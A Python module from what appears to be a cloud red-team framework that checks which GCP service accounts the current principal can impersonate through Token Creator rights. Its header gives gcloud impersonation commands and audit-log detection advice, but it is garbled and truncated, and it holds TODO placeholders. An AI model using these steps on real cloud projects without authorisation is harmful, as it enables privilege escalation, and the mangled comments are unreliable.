# ================================================================
# TECHNIQUE: escalation/gcp_sa_token_creator
# ----------------------------------------------------------------
# TACTIC:    Privilege Escalation (TA0004)
# TECHNIQUE: TODO — TODO
#
# PURPOSE:
#   This permission allows generating a short-lived OAuth2 access token for
#   the target service account. The attacker inherits all the permissions of
#   the impersonated SA for the duration of the token (default: 1 hour).
#
# PROVIDERS: gcp
#
#
# HOW IT WORKS (GCP):
#   # Identify service accounts and their roles gcloud iam service-accounts
#   list gcloud projects get-iam-policy <project> --format=json | \   jq
#   '.bindings[] | select(.members[] | contains("serviceAccount"))'  # Find
#   which SAs you have token creator rights on # (check your current SA's
#   policy bindings)  # Generate a token for a target SA gcloud auth print-
#   access-token \   --impersonate-service-account=privesc-
#   target@<project>.iam.gserviceaccount.com  # Or via API: curl -X POST \
#   -H "Authorization: Bearer $(gcloud auth print-access-token)" \   -H
#   "Content-Type: application/json" \   "https://iamc (see attack map for
#   full steps)
#
# DETECTION (GCP):
#   Cloud Audit Logs: iam.googleapis.com/GenerateAccessToken — logged as
#   Admin Activity Alert: GenerateAccessToken where caller ≠ expected
#   automation SA Note: Token use itself (the impersonated calls) also logs
#   with callerSuppliedUserAgent
# REFERENCES:
#   - See: docs/architecture/attack_maps/iam_privesc_gcp.md
#
# SAFE:      No — creates/modifies resources
# ================================================================


import json
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

try:
    from google.cloud import iam_admin_v1, resourcemanager_v3
except ImportError:
    resourcemanager_v3 = None
    iam_admin_v1 = None

@technique(
    technique_id='escalation/gcp_sa_token_creator',
    tactic="Privilege Escalation",
    mitre_id="T1078.004",
    providers=['gcp'],
    severity='high',
    safe=False,
    description="Generate an access token to impersonate a high-privilege service account.",
)
def execute(ctx: ExecutionContext):
    """
    Chain 1: serviceAccountTokenCreator → Token as Any Attached SA
    Generated from: escalation__gcp_sa_token_creator.yaml
    """
    # TODO: implement for each provider — replace NotImplementedError with real logic
    if ctx.provider == 'gcp':
        whoami_res = ctx.whoami()
        if whoami_res.principal_type == "unknown":
            ctx.log("Could not determine principal type. Cannot enumerate IAM.")
            return {"status": "error", "error": "unknown principal"}

        return {"status": "success", "findings": _gcp(ctx, whoami_res)}

    ctx.log(f"Provider {ctx.provider} not implemented for this technique.")
    return {"status": "error", "error": "Not implemented"}


def _gcp(ctx: ExecutionContext, whoami_res: Any) -> list[dict[str, Any]]:
    """Enumerate SAs the current principal has Token Creator rights on."""
    if resourcemanager_v3 is None or iam_admin_v1 is None:
        ctx.log("google-cloud-resource-manager or google-cloud-iam not installed.")
        return []

    principal_id = whoami_res.principal_id
    member_str = f"user:{principal_id}"
    if whoami_res.principal_type == "service_account":
        member_str = f"serviceAccount:{principal_id}"

    client = resourcemanager_v3.ProjectsClient(credentials=ctx.session)
    iam_client = iam_admin_v1.IAMClient(credentials=ctx.session)
    projects = []

    try:
        for p in client.search_projects():
            projects.append(p.project_id)
    except Exception as e:
        ctx.log(f"Failed to search projects: {e}")
        if whoami_res.account_id and whoami_res.account_id != "unknown":
            projects.append(whoami_res.account_id)

    findings = []

    for pid in set(projects):
        try:
            # 1. Project-level token creator check
            req = {"resource": f"projects/{pid}"}
            policy = client.get_iam_policy(request=req)

            project_level_token_creator = False
            for binding in policy.bindings:
                if binding.role in ["roles/iam.serviceAccountTokenCreator", "roles/editor", "roles/owner"]:
                    if member_str in binding.members:
                        project_level_token_creator = True
                        break

            # 2. List all Service Accounts in the project to check SA-level token creator
            sa_req = {"name": f"projects/{pid}"}
            for sa in iam_client.list_service_accounts(request=sa_req):
                sa_email = sa.email
                can_impersonate = project_level_token_creator

                if not can_impersonate:
                    # Check SA-level policy bindings
                    try:
                        sa_policy_req = {"resource": sa.name}
                        sa_policy = iam_client.get_iam_policy(request=sa_policy_req)
                        for binding in sa_policy.bindings:
                            if binding.role == "roles/iam.serviceAccountTokenCreator":
                                if member_str in binding.members:
                                    can_impersonate = True
                                    break
                    except Exception:
                        # May lack permission to read SA policy, which is fine
                        pass

                if can_impersonate:
                    finding_details = {
                        "target_sa": sa_email,
                        "project": pid,
                        "method": "roles/iam.serviceAccountTokenCreator"
                    }
                    findings.append(finding_details)

                    ctx.workspace.add_finding(
                        technique_id=ctx.technique_id,
                        tactic="escalation",
                        mitre_id="TODO",
                        title=f"Able to Impersonate GCP Service Account: {sa_email}",
                        severity="high",
                        provider="gcp",
                        description=f"Principal {member_str} has Token Creator rights over {sa_email}, allowing full impersonation via short-lived access tokens.",
                        evidence=json.dumps(finding_details, indent=2)
                    )

        except Exception as e:
            ctx.log(f"Error enumerating SAs in project {pid}: {e}")

    return findings

